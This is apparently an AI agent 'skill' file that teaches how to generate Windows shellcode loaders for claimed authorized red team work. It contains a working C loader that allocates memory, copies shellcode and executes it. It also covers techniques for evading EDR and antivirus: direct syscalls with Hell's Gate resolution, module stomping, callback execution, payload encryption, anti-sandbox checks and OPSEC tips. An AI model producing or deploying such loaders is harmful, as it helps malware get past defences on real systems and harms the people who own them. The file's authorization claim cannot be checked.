---
name: shellcode-loader-generate
description: "Generating shellcode loaders: allocation and execution patterns, encryption, and API resolution that avoids obvious signatures. Use this skill when building a loader for authorized red team use."
---

# Shellcode Loaders

## Overview

A loader allocates memory, decrypts shellcode into it, and transfers execution. Detection comes from the API sequence and memory permissions.

## Minimal C loader

```c
#include <windows.h>

int main(void) {
    unsigned char sc[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0 /* ... */ };
    SIZE_T n = sizeof(sc);
    LPVOID p = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!p) return 1;
    memcpy(p, sc, n);
    DWORD old;
    VirtualProtect(p, n, PAGE_EXECUTE_READ, &old);
    ((void(*)())p)();
    return 0;
}
```

## Avoiding the classic signature

The `VirtualAlloc(RWX) -> memcpy -> CreateThread` sequence is heavily signatured. Alternatives:

- **`NtAllocateVirtualMemory` / `NtProtectVirtualMemory`** — direct syscalls bypass user-mode hooks.
- **Section mapping** — `NtCreateSection` + `NtMapViewOfSection` gives executable memory without an explicit protect call.
- **Module stomping** — overwrite a loaded DLL's `.text` with shellcode; the memory is already executable and file-backed.
- **`Fiber`** execution instead of `CreateThread`.
- **Callback execution** — `EnumFontsW`, `EnumWindows`, `CreateTimerQueueTimer`, `SetWindowLongPtr`.

## Encryption

```c
// XOR at build time, decrypt at runtime
for (int i = 0; i < n; i++) sc[i] ^= 0x5A;
```

Better: a per-build key, or AES with the key derived from an environment value.

## Direct syscalls

```asm
; x64 syscall stub
mov r10, rcx
mov eax, <SSN>
syscall
ret
```

Get the SSN at runtime by sorting `ntdll` exports (Hell's Gate) or by reading the stub. Fresh SSNs avoid hardcoded-value signatures.

## Anti-sandbox

- Check uptime, CPU count, RAM.
- Check for analysis tools by window class or process name.
- Delay execution.

## OPSEC

- Strip the PE header from the shellcode before writing it.
- Sleep with `NtDelayExecution` rather than `Sleep`.
- Avoid strings that name the framework.

## Pitfalls

- `PAGE_EXECUTE_READWRITE` anywhere is a strong EDR signal.
- Thread creation from an unbacked region is a top-tier detection.
- Hardcoded SSNs break across Windows builds.

## Verification

The loader must execute the shellcode and reach a callback in the target environment.
